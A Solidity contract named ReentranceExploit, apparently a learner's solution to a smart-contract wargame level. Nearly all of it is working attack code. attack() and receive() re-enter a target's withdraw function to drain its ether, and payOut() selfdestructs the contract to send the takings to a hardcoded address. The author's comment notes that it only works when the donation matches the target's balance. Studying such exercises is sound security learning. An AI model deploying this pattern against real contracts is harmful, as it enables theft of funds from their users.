// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";


interface Reentrance{
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

// This implementation only works if you match the contract-balance with the donation-payment, even though I fully get the idea, 
// I did not manage to get it working with more deeply nested reentrancies
contract ReentranceExploit {
    address payable public targetAddress;

    constructor(address _address) payable {
        targetAddress = payable(_address);
    }

    function attack() public {
        uint256 balanceTotal = targetAddress.balance;
        Reentrance(targetAddress).donate{value: balanceTotal, gas: 1000000}(address(this));
        Reentrance(targetAddress).withdraw(balanceTotal);
    }

    receive() external payable {
        uint256 balanceTotal = targetAddress.balance;
        if (balanceTotal > 0) {
            Reentrance(targetAddress).withdraw(balanceTotal);
        }
    }

    function payOut() public{
        selfdestruct(payable(address(0x737e11E7A11A01891d2cB1b0A07C59A63dcd657C)));
    }
}